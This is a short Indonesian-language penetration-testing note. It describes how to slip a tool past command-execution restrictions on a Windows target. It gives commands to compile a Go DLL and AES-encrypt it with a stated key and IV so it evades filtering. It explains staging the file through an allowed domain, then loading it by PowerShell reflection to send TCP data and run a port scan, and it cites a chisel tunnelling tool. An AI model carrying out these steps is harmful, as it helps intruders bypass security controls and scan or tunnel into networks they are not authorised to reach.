## Background Story

Di sini agak sedih juga sih, karena dikasih akses ke PowerShell. Seharusnya semua akses ke command execution itu diblokir, even LOLBAS (listed atau non-listed).

## PoC

```
iv: 5030511e51bbf22fb651936cbeeed884
key: 2814a9ddc9529f174206d5c030229e610cdac08da698003ab0a8f5fcad93a095
```

```console
$ CGO_ENABLED=1 GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc go build -buildmode=c-shared -ldflags "-extldflags=-static" -o hello.dll ./hello.go
$ openssl enc -aes-256-cbc -K "2814a9ddc9529f174206d5c030229e610cdac08da698003ab0a8f5fcad93a095" -iv "5030511e51bbf22fb651936cbeeed884" -in phapp/hello.dll -out tolol.txt
```
transfer `tolol.txt` ke protokol yang diizinin, misal kalo cuma boleh akses HTTP via browser-only, cari domain yang diizinin, upload disitu. download ke mesin target. 

example powershell calls
```console
PS> . .\reflection.ps1
PS> [abc.abcabc]::NetcatSendTCP("127.0.0.1", 12345, "hello from pwsh", 200, 1) | Out-Null
PS> [abc.abcabc]::PortScan("127.0.0.1", 1, 65535, 200, 1, "C:\scans\127.0.0.1_scan.txt")
```

## References
1. <https://github.com/shantanu561993/SharpChisel/tree/master/Go/chisel-64>
